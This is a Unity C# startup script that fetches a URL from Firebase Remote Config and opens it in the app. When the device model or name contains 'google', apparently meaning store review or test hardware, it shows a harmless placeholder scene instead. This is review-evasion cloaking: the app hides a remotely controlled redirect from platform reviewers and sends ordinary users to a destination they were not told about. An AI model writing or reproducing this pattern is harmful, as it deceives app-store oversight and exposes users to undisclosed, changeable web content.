using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Firebase;
using Firebase.Analytics;
using Firebase.Extensions;
using Firebase.RemoteConfig;
using NaughtyAttributes;
using UnityEngine;
using UnityEngine.SceneManagement;

public class FirebaseInit : MonoBehaviour
{
    [SerializeField, Scene] private string plug, noInternet;
    [SerializeField] private LinkTo linkTo;
    [ShowNonSerializedField] private string url = "", savedLink = "";


    private void Start()
    {
        savedLink = PlayerPrefs.GetString("url", null);
        if (!string.IsNullOrEmpty(savedLink))
        {
            if (Application.internetReachability == NetworkReachability.NotReachable)
            {
                SceneManager.LoadScene(noInternet);
                return;
            }
            _ = LinkToFireBase();
        }
        else
        {
            if (Application.internetReachability == NetworkReachability.NotReachable)
            {
                SceneManager.LoadScene(plug);
                return;
            }
            _ = LinkToFireBase();
        }
    }

    private Task<Task> LinkToFireBase()
    {
        return FirebaseApp.CheckAndFixDependenciesAsync().ContinueWith(async task =>
        {
            DependencyStatus dependencyStatus = task.Result;
            if (dependencyStatus == DependencyStatus.Available)
            {
                FirebaseAnalytics.SetAnalyticsCollectionEnabled(true);

                _ = FirebaseRemoteConfig.DefaultInstance.SetDefaultsAsync(new Dictionary<string, object>()
                 {
                     { "url", "" }
                 });
                if (FirebaseRemoteConfig.DefaultInstance.Keys.Count() > 0)
                {
                    await FetchDataAsync();
                    url = FirebaseRemoteConfig.DefaultInstance.GetValue("url").StringValue;
                    if (!string.IsNullOrEmpty(url) || !string.IsNullOrEmpty(savedLink))
                    {
                        if (SystemInfo.deviceModel.ToLower().Contains("google") || SystemInfo.deviceName.ToLower().Contains("google"))
                        {
                            SceneManager.LoadScene(plug);
                            return;
                        }

                        if (string.IsNullOrEmpty(url))
                        {
                            linkTo.GoToLink(savedLink);
                        }
                        else
                        {
                            PlayerPrefs.SetString("url", url);
                            linkTo.GoToLink(url);
                        }
                    }
                    else
                    {
                        SceneManager.LoadScene(plug);
                    }
                }
            }
            else
            {
                SceneManager.LoadScene(plug);
            }
        });
    }

    public Task FetchDataAsync()
    {
        Task fetchTask =
        FirebaseRemoteConfig.DefaultInstance.FetchAsync(
            TimeSpan.Zero);
        return fetchTask.ContinueWithOnMainThread(FetchComplete);
    }

    private void FetchComplete(Task fetchTask)
    {
        if (!fetchTask.IsCompleted)
        {
            return;
        }

        FirebaseRemoteConfig remoteConfig = FirebaseRemoteConfig.DefaultInstance;
        ConfigInfo info = remoteConfig.Info;
        if (info.LastFetchStatus != LastFetchStatus.Success)
        {
            return;
        }

        _ = remoteConfig.ActivateAsync();
    }
}
